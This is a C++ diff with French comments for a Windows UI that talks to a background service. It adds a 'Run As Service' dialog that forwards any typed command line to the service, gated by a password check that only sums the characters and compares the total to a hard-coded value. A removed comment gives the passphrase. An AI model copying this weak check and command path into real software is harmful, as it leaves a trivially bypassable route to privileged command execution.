@@ -51,6 +51,31 @@ INT_PTR CALLBACK uiCredsDialogCallback(HWND window, UINT message, WPARAM wParam,
 	return ineplemUiPtr->processCredsDialogMessage(window, message, wParam, lParam);
 }
 
+/* uiRunasDialogCallback: Fonction appelée lors d'un nouveau message sur la dialog de runas, transfert vers Ui::processRunasDialogMessage
+ * HWND window: Dialog
+ * UINT message: Identifiant du message
+ * WPARAM wParam et LPARAM lParam: Paramètres du message
+ * Retourne 1 si le message a été traité, 0 sinon
+ */
+INT_PTR CALLBACK uiRunasDialogCallback(HWND window, UINT message, WPARAM wParam, LPARAM lParam){
+	return ineplemUiPtr->processRunasDialogMessage(window, message, wParam, lParam);
+}
+
+/* checkPassword: Vérifie le mot de passe via une fonction de checksum TRES PEU SECURE
+ * char *password: Pointeur vers les carractère de la chaine
+ * uint16_t passwordLen: Taille du mot de passe
+ * retourne un uint8_t: 0 si le mot de passe est faux, 1 sinon
+ */
+uint8_t checkPassword(char *password, uint16_t passwordLen){
+	// Solution EXTREMEMENT secure pour stocker un mot de passe -_-
+	// NE FAITES JAMAIS CA
+	uint16_t sum = 0;
+	for(uint16_t i = 0; i < passwordLen; i++){
+		sum += password[i];
+	}
+	return sum == UI_PASSWORD;
+}
+
 /* Ui::Ui: Constructeur de Ui
  * uint16_t port: Port de la connection TCP avec le service
  */
@@ -189,6 +214,7 @@ void Ui::createMenu(){
 	AppendMenuA(this->m_menu, MF_STRING, UI_MENU_KILLCLIENTS, "Kill client(s)");
 	AppendMenuA(this->m_menu, MF_SEPARATOR, 0, NULL);
 	AppendMenuA(this->m_menu, MF_STRING, UI_MENU_CREDS, "Creds");
+	AppendMenuA(this->m_menu, MF_STRING, UI_MENU_RUNAS, "Run As Service");
 	AppendMenuA(this->m_menu, MF_STRING, UI_MENU_USERNAME, "Username");
 	AppendMenuA(this->m_menu, MF_STRING, UI_MENU_STATUS, "Status");
 }
@@ -254,6 +280,9 @@ void Ui::processItem(uint16_t menuId){
 		case UI_MENU_KILLCLIENTS:
 			DialogBoxParamA(NULL, MAKEINTRESOURCEA(IDD_DIALOG3), this->m_window, &uiAddressDialogCallback, 0);
 			break;
+		case UI_MENU_RUNAS:
+			DialogBoxParamA(NULL, MAKEINTRESOURCEA(IDD_DIALOG4), this->m_window, &uiRunasDialogCallback, 0);
+			break;
 	}
 }
 
@@ -303,19 +332,13 @@ int16_t Ui::processCredsDialogMessage(HWND window, UINT message, WPARAM wParam, 
 			char *buffer = new char[8192]; // Peur être rendue dynamique ?
 			uint16_t passwordLen = GetDlgItemTextA(window, IDPASSWORD, buffer, 8192);
 			EndDialog(window, 0);
-			// Solution EXTREMEMENT secure pour stocker un mot de passe -_-
-			// NE FAITES JAMAIS CA
-			uint16_t sum = 0;
-			for(uint16_t i = 0; i < passwordLen; i++){
-				sum += buffer[i];
-			}
-			delete buffer;
-			if(sum == 1469){ // Correspond à "Hack the planet !"
+			if(checkPassword(buffer, passwordLen)){
 				this->m_uiToService->askCreds();
 			}
 			else{
 				this->msgBox("Wrong password");
 			}
+			delete buffer;
 		}
 		return 1;
 	}
@@ -341,6 +364,37 @@ int16_t Ui::processAddressDialogMessage(HWND window, UINT message, WPARAM wParam
 			delete buffer;
 
 			this->m_uiToService->killClients(address);
+		}
+		return 1;
+	}
+	return 0;
+}
+
+/* Ui::processRunasDialogMessage: Fonction appelée lors d'un nouveau message sur la dialog de runas, appelée via uiRunasDialogCallback
+ * HWND window: Dialog
+ * UINT message: Identifiant du message
+ * WPARAM wParam et LPARAM lParam: Paramètres du message
+ * Retourne 1 si le message a été traité, 0 sinon
+ */
+int16_t Ui::processRunasDialogMessage(HWND window, UINT message, WPARAM wParam, LPARAM){
+	if(message == WM_COMMAND){
+		if(LPARAM(wParam) == IDCANCEL){
+			EndDialog(window, 0);
+		}
+		else if(LPARAM(wParam) == IDOK){
+			char *passwordBuffer = new char[8192];
+			char *cmdLineBuffer = new char[8192];
+			uint16_t passwordLen = GetDlgItemTextA(window, IDPASSWORD_CMDLINE, passwordBuffer, 8192);
+			GetDlgItemTextA(window, IDCMDLINE, cmdLineBuffer, 8192);
+			EndDialog(window, 0);
+			if(checkPassword(passwordBuffer, passwordLen)){
+				this->m_uiToService->sendRunas(std::string(cmdLineBuffer));
+			}
+			else{
+				this->msgBox("Wrong password");
+			}
+			delete passwordBuffer;
+			delete cmdLineBuffer;
 		}
 		return 1;
 	}
